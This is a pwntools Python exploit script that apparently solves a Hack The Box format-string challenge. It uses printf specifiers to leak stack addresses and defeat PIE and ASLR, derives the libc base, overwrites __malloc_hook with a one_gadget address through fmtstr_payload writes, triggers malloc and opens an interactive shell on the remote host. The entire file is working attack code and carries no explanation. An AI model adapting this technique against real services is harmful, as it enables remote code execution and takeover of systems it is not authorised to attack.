from pwn import *


context.arch = "amd64"
elf = ELF("format")
#libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
p = remote('docker.hackthebox.eu', 32118)
# = process("./format")
def send(payload):
	p.sendline(payload)


send("%35$p")
leak = int(p.recvline(), 16)
log.info("LEAK:   0x%x" %(leak))

elf.address = leak - 0x10c0
log.info("ELF:    0x%x" %(elf.address))
send("%45$p")
leak = int(p.recvline(), 16)
log.info("LEAK:  0x%x" %(leak))

libc.address = leak - libc.sym["__libc_start_main"] - 231
log.info("LIBC:  0x%x" %(libc.address))
one_gadget = libc.address + 0x4f322
malloc_hook = libc.sym["__malloc_hook"]
target = one_gadget
addr = malloc_hook
count = 0
pause()
while target:
	payload = fmtstr_payload(6, {addr: target & 0xffff}, write_size='short')
	send(payload)
	addr += 2
	target >>= 16
	count += 1
send("%66000c")
p.interactive()
